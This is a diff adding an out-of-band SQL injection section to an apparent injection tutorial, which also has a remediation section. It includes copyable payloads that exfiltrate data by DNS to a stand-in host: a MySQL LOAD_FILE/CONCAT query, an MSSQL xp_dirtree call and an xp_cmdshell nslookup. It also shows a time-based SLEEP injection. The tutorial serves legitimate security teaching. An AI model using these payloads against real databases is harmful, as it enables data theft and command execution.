@@ -322,7 +322,38 @@ admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password
 
 ## Out-of-Band SQL Injection
 
-This one is used when everything else has failed.
+This one is used when everything else has failed. But for out-of-band (OOB) SQL injection to work, the database server should be able to make outbound connection. 
+
+There are two channels involved:
+
+- The attacker channel where you send the normal SQL payloads
+- The data channel where the database server makes the outbound connection to your server
+
+## DNS Exfiltration With MySQL
+
+The most common OOB trick for MySQL uses LOAD_FILE() to trigger a DNS lookup. Here is the example:
+
+```sql-text
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
+```
+
+- `SELECT database()` pulls the database name, in this scenario, it's `webapp_db`.
+- `CONCAT ()` builds or concatenate the string, like `\\webapp_db.attacker.com\share`.
+- `LOAD_FILE()` reads the file path.
+
+## MSSQL Techniques
+
+Microsoft SQL Server has a direct method, with `xp_dirtree`. Example:
+
+```sql-text
+EXEC master..xp_dirtree '\\attacker.com\share';
+```
+
+`xp_cmdshell` (if it is enabled) runs OS commands directly
+
+```sql-text
+EXEC xp_cmdshell 'nslookup data.attacker.com';
+```
 
 ## Remediation and Prevention
 
